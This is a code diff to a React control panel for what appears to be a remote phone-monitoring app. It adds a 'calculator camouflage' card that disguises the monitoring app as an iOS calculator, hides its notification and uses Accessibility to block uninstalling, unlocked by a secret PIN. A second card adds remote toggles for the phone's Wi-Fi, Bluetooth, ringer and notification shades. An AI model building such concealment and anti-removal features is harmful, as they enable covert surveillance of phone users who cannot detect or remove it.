@@ -67,7 +67,8 @@ import {
   MapPin,
   MessageSquare,
   Pause,
-  WifiOff
+  WifiOff,
+  RotateCw
 } from 'lucide-react';
 import { useStore } from '../store/StoreContext';
 
@@ -211,6 +212,10 @@ export default function Controls() {
     updateVolumeSos,
     callRecording,
     updateCallRecording,
+    camouflage,
+    updateCamouflage,
+    quickSettings,
+    sendQuickSetting,
     locations,
     sendCommand,
     pushToast
@@ -240,6 +245,7 @@ export default function Controls() {
   const [timelapseFacingInput, setTimelapseFacingInput] = useState('back');
   const [selectedTimelapsePhoto, setSelectedTimelapsePhoto] = useState(null);
   const [showTimelapseModal, setShowTimelapseModal] = useState(false);
+  const [disguisePinInput, setDisguisePinInput] = useState('9211');
 
   const downloadTimelapsePhoto = (base64Data, filename) => {
     if (!base64Data) return;
@@ -1745,6 +1751,354 @@ export default function Controls() {
             >
               🎙️ Open Vault
             </button>
+          </div>
+        </div>
+
+        {/* KIDS SAFETY & IOS CALCULATOR CAMOUFLAGE */}
+        <div className="rounded-xl border border-amber-500/40 bg-gradient-to-br from-gray-900 via-amber-950/20 to-gray-950 p-5 shadow-lg flex flex-col justify-between">
+          <div>
+            <div className="flex items-center justify-between mb-4 border-b border-gray-800 pb-3">
+              <div className="flex items-center gap-2.5">
+                <div className="p-2 rounded-lg bg-amber-500/20 border border-amber-500/40 text-amber-400">
+                  <Shield className="h-4 w-4" />
+                </div>
+                <div>
+                  <h3 className="font-semibold text-gray-100 text-sm">Kids Safety &amp; iOS Calculator Camouflage</h3>
+                  <p className="text-[11px] text-gray-400">Stealth app disguise, invisible notification &amp; anti-tamper</p>
+                </div>
+              </div>
+              <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${
+                camouflage?.calculatorDisguise
+                  ? 'border-amber-500/60 bg-amber-950 text-amber-300'
+                  : 'border-gray-700 bg-gray-800 text-gray-400'
+              }`}>
+                {camouflage?.calculatorDisguise ? '🧮 CALCULATOR ACTIVE' : 'STANDARD ICON'}
+              </span>
+            </div>
+
+            <p className="text-xs text-gray-300 mb-4 bg-gray-950/70 p-3 rounded-lg border border-gray-800 leading-relaxed">
+              When Camouflage is active, the app icon on the phone changes to <strong>"Calculator"</strong> with a real iOS calculator interface. Kids can calculate normally and will never know it's a parental monitor. Type your secret PIN and press <strong>=</strong> to open settings.
+            </p>
+
+            <div className="space-y-3 mb-4">
+              <div className="flex items-center justify-between bg-gray-950/60 p-2.5 rounded-lg border border-gray-800/80">
+                <div>
+                  <span className="text-xs text-gray-200 font-semibold block">Disguise as iOS Calculator</span>
+                  <span className="text-[10px] text-gray-400 block">Changes launcher icon to Calculator &amp; opens real calculator</span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => updateCamouflage({
+                    calculatorDisguise: !camouflage?.calculatorDisguise
+                  })}
+                  className={`px-3 py-1 rounded-md text-xs font-bold transition ${
+                    camouflage?.calculatorDisguise
+                      ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
+                      : 'bg-gray-800 text-gray-400 border border-gray-700'
+                  }`}
+                >
+                  {camouflage?.calculatorDisguise ? 'ENABLED' : 'OFF'}
+                </button>
+              </div>
+
+              <div className="flex items-center justify-between bg-gray-950/60 p-2.5 rounded-lg border border-gray-800/80">
+                <div>
+                  <span className="text-xs text-gray-200 font-semibold block">Invisible Notification</span>
+                  <span className="text-[10px] text-gray-400 block">Transparent icon &amp; blank text — zero status bar clues for kids</span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => updateCamouflage({
+                    stealthNotification: camouflage?.stealthNotification === false ? true : false
+                  })}
+                  className={`px-3 py-1 rounded-md text-xs font-bold transition ${
+                    camouflage?.stealthNotification !== false
+                      ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
+                      : 'bg-gray-800 text-gray-400 border border-gray-700'
+                  }`}
+                >
+                  {camouflage?.stealthNotification !== false ? 'INVISIBLE' : 'VISIBLE'}
+                </button>
+              </div>
+
+              <div className="flex items-center justify-between bg-gray-950/60 p-2.5 rounded-lg border border-gray-800/80">
+                <div>
+                  <span className="text-xs text-gray-200 font-semibold block">Anti-Uninstall Settings Shield</span>
+                  <span className="text-[10px] text-gray-400 block">Accessibility automatically kicks kid to Home if they open App Info / Uninstall</span>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => updateCamouflage({
+                    antiTamper: camouflage?.antiTamper === false ? true : false
+                  })}
+                  className={`px-3 py-1 rounded-md text-xs font-bold transition ${
+                    camouflage?.antiTamper !== false
+                      ? 'bg-red-500/20 text-red-300 border border-red-500/40'
+                      : 'bg-gray-800 text-gray-400 border border-gray-700'
+                  }`}
+                >
+                  {camouflage?.antiTamper !== false ? 'PROTECTED' : 'OFF'}
+                </button>
+              </div>
+
+              <div className="bg-gray-950/60 p-2.5 rounded-lg border border-gray-800/80 flex items-center justify-between gap-3">
+                <div className="min-w-0 flex-1">
+                  <span className="text-xs text-gray-200 font-semibold block">Secret Parent Unlock PIN</span>
+                  <span className="text-[10px] text-gray-400 block">Type this number on calculator and press = to unlock</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <input
+                    type="password"
+                    maxLength={8}
+                    value={disguisePinInput}
+                    onChange={(e) => setDisguisePinInput(e.target.value)}
+                    placeholder="9211"
+                    className="w-20 bg-gray-900 border border-gray-700 rounded px-2.5 py-1 text-xs text-center text-white font-mono"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => {
+                      if (disguisePinInput.length < 4) {
+                        pushToast('PIN must be at least 4 digits', 'error');
+                        return;
+                      }
+                      updateCamouflage({ ownerPin: disguisePinInput });
+                      pushToast('Secret Parent PIN updated on phone!', 'success');
+                    }}
+                    className="px-2.5 py-1 rounded bg-amber-600 hover:bg-amber-500 text-black font-bold text-xs shadow"
+                  >
+                    Set PIN
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div className="flex gap-2">
+            <button
+              type="button"
+              onClick={() => updateCamouflage({
+                calculatorDisguise: !camouflage?.calculatorDisguise,
+                stealthNotification: true,
+                antiTamper: true
+              })}
+              className={`w-full py-2 px-3 rounded-lg text-xs font-bold transition-all border ${
+                camouflage?.calculatorDisguise
+                  ? 'border-amber-500/50 bg-amber-500/20 text-amber-300 hover:bg-amber-500/30'
+                  : 'border-gray-700 bg-gray-800 text-gray-300 hover:bg-gray-700'
+              }`}
+            >
+              {camouflage?.calculatorDisguise ? '✓ Full Camouflage Active' : '🧮 Activate iOS Calculator Camouflage'}
+            </button>
+          </div>
+        </div>
+
+        {/* PHONE HARDWARE & QUICK SETTINGS CONTROLS CARD */}
+        <div className="rounded-xl border border-gray-800 bg-gray-900 p-5 shadow-lg flex flex-col justify-between">
+          <div>
+            <div className="flex items-center justify-between mb-4 border-b border-gray-800 pb-3">
+              <h3 className="font-semibold text-gray-100 flex items-center gap-2 text-sm">
+                <Sliders className="h-4 w-4 text-cyan-400" /> Phone Hardware &amp; Quick Settings
+              </h3>
+              <div className="flex items-center gap-2">
+                <button
+                  type="button"
+                  onClick={() => sendQuickSetting('status')}
+                  className="p-1 rounded text-gray-400 hover:text-white hover:bg-gray-800 transition"
+                  title="Refresh Quick Settings status"
+                >
+                  <RefreshCw className="h-3.5 w-3.5" />
+                </button>
+              </div>
+            </div>
+
+            <p className="text-xs text-gray-400 mb-4 leading-relaxed">
+              Remote hardware toggles &amp; quick setting panels (Wi-Fi, Bluetooth, Hotspot, Auto-Rotate, Torch, DND, Ringer &amp; Status Shade).
+            </p>
+
+            <div className="grid grid-cols-2 gap-2.5 mb-3">
+              {/* Wi-Fi Control */}
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('wifi', { enable: !quickSettings?.wifiEnabled })}
+                className={`p-2.5 rounded-lg border text-left flex flex-col gap-1 transition ${
+                  quickSettings?.wifiEnabled
+                    ? 'border-cyan-500/40 bg-cyan-950/20 text-cyan-300'
+                    : 'border-gray-800 bg-gray-950/60 text-gray-300 hover:border-gray-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="flex items-center gap-1.5 text-xs font-semibold">
+                    <Wifi className="h-3.5 w-3.5 text-cyan-400" /> Wi-Fi
+                  </span>
+                  <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-black/40">
+                    {quickSettings?.wifiEnabled ? 'ON' : 'PANEL'}
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400">Toggle / Open Panel</span>
+              </button>
+
+              {/* Bluetooth Control */}
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('bluetooth', { enable: !quickSettings?.bluetoothEnabled })}
+                className={`p-2.5 rounded-lg border text-left flex flex-col gap-1 transition ${
+                  quickSettings?.bluetoothEnabled
+                    ? 'border-indigo-500/40 bg-indigo-950/20 text-indigo-300'
+                    : 'border-gray-800 bg-gray-950/60 text-gray-300 hover:border-gray-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="flex items-center gap-1.5 text-xs font-semibold">
+                    <Radio className="h-3.5 w-3.5 text-indigo-400" /> Bluetooth
+                  </span>
+                  <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-black/40">
+                    {quickSettings?.bluetoothEnabled ? 'ON' : 'OFF'}
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400">Toggle Bluetooth</span>
+              </button>
+
+              {/* Hotspot / Tethering */}
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('hotspot')}
+                className="p-2.5 rounded-lg border border-gray-800 bg-gray-950/60 text-gray-300 hover:border-amber-500/40 hover:bg-amber-950/20 hover:text-amber-300 text-left flex flex-col gap-1 transition"
+              >
+                <div className="flex items-center justify-between">
+                  <span className="flex items-center gap-1.5 text-xs font-semibold">
+                    <Signal className="h-3.5 w-3.5 text-amber-400" /> Hotspot
+                  </span>
+                  <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-black/40">
+                    OPEN
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400">Tethering Settings</span>
+              </button>
+
+              {/* Auto-Rotate */}
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('auto_rotate')}
+                className={`p-2.5 rounded-lg border text-left flex flex-col gap-1 transition ${
+                  quickSettings?.autoRotate
+                    ? 'border-emerald-500/40 bg-emerald-950/20 text-emerald-300'
+                    : 'border-gray-800 bg-gray-950/60 text-gray-300 hover:border-gray-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="flex items-center gap-1.5 text-xs font-semibold">
+                    <RotateCw className="h-3.5 w-3.5 text-emerald-400" /> Auto-Rotate
+                  </span>
+                  <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-black/40">
+                    {quickSettings?.autoRotate ? 'ON' : 'LOCKED'}
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400">Screen Orientation</span>
+              </button>
+
+              {/* Flashlight / Torch */}
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('torch')}
+                className={`p-2.5 rounded-lg border text-left flex flex-col gap-1 transition ${
+                  quickSettings?.torchOn || torchOn
+                    ? 'border-yellow-500/40 bg-yellow-950/20 text-yellow-300'
+                    : 'border-gray-800 bg-gray-950/60 text-gray-300 hover:border-gray-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="flex items-center gap-1.5 text-xs font-semibold">
+                    <Zap className="h-3.5 w-3.5 text-yellow-400" /> Flashlight
+                  </span>
+                  <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-black/40">
+                    {quickSettings?.torchOn || torchOn ? 'ON' : 'OFF'}
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400">Rear LED Torch</span>
+              </button>
+
+              {/* Do Not Disturb */}
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('dnd')}
+                className={`p-2.5 rounded-lg border text-left flex flex-col gap-1 transition ${
+                  quickSettings?.dndActive || dndStatus
+                    ? 'border-purple-500/40 bg-purple-950/20 text-purple-300'
+                    : 'border-gray-800 bg-gray-950/60 text-gray-300 hover:border-gray-700'
+                }`}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="flex items-center gap-1.5 text-xs font-semibold">
+                    <BellOff className="h-3.5 w-3.5 text-purple-400" /> DND Mode
+                  </span>
+                  <span className="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-black/40">
+                    {quickSettings?.dndActive || dndStatus ? 'ON' : 'OFF'}
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400">Silence All Alerts</span>
+              </button>
+            </div>
+
+            {/* Quick Settings Shade & Notifications Shade Pulldown */}
+            <div className="grid grid-cols-2 gap-2 pt-2 border-t border-gray-800/80">
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('shade')}
+                className="py-1.5 px-2.5 rounded-lg border border-gray-800 bg-gray-950/70 hover:bg-gray-800 text-gray-300 text-[11px] font-medium transition flex items-center justify-center gap-1.5"
+                title="Pull down the Android Quick Settings tile shade"
+              >
+                <Sliders className="h-3 w-3 text-cyan-400" /> Pull Down Tiles
+              </button>
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('notifications_shade')}
+                className="py-1.5 px-2.5 rounded-lg border border-gray-800 bg-gray-950/70 hover:bg-gray-800 text-gray-300 text-[11px] font-medium transition flex items-center justify-center gap-1.5"
+                title="Pull down notification shade"
+              >
+                <Bell className="h-3 w-3 text-emerald-400" /> Pull Notifications
+              </button>
+            </div>
+          </div>
+
+          {/* Ringer Quick Switch */}
+          <div className="mt-3 pt-3 border-t border-gray-800/80 flex items-center justify-between">
+            <span className="text-[11px] text-gray-400">Ringer Profile:</span>
+            <div className="flex gap-1.5">
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('ringer_normal')}
+                className={`px-2 py-0.5 rounded text-[10px] font-bold transition border ${
+                  quickSettings?.ringerMode === 'normal' || volumeInfo?.ringerMode?.toLowerCase() === 'normal'
+                    ? 'border-emerald-500/50 bg-emerald-500/20 text-emerald-300'
+                    : 'border-gray-800 bg-gray-950 text-gray-400 hover:text-gray-200'
+                }`}
+              >
+                Normal
+              </button>
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('ringer_vibrate')}
+                className={`px-2 py-0.5 rounded text-[10px] font-bold transition border ${
+                  quickSettings?.ringerMode === 'vibrate' || volumeInfo?.ringerMode?.toLowerCase() === 'vibrate'
+                    ? 'border-amber-500/50 bg-amber-500/20 text-amber-300'
+                    : 'border-gray-800 bg-gray-950 text-gray-400 hover:text-gray-200'
+                }`}
+              >
+                Vibrate
+              </button>
+              <button
+                type="button"
+                onClick={() => sendQuickSetting('ringer_silent')}
+                className={`px-2 py-0.5 rounded text-[10px] font-bold transition border ${
+                  quickSettings?.ringerMode === 'silent' || volumeInfo?.ringerMode?.toLowerCase() === 'silent'
+                    ? 'border-rose-500/50 bg-rose-500/20 text-rose-300'
+                    : 'border-gray-800 bg-gray-950 text-gray-400 hover:text-gray-200'
+                }`}
+              >
+                Silent
+              </button>
+            </div>
           </div>
         </div>
 
